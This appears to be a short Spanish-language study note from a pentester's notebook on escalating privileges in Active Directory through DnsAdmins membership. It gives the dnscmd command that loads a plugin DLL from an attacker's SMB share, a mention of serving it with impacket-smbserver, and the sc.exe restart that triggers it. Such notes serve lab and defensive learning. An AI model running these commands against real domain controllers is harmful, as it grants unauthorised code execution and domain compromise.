
-------------------
#activeDirectory #privilegeescalation #windows  

-----------------

- Cuando estemos en el grupo DnsAdmin podremos llegar a escalar nuestro privilegios realizando lo siguiente.

- Creamos un dll malicioso abusando del grupo dll admin utilizando el siguiente comando que pudimos obtener de LOLBAS

``` powershell
dnscmd.exe /config /serverlevelplugindll  \\ipLocal\smbFolder\pwned.exe 
```


![[Pasted image 20240602171214.png]]

- Despues lo tuvimos que compartir usando impacket-smbserver

- Y lo llegamos a ejecutar de la siguiente manera

`sc.exe start dns`

- (Si vemos que a la primera no nos llega a funcionar debemos parar el servicio volver a compartirlo usando el comando que utilizamos al principio y volver a iniciar el dll)

![[Pasted image 20240602171541.png]]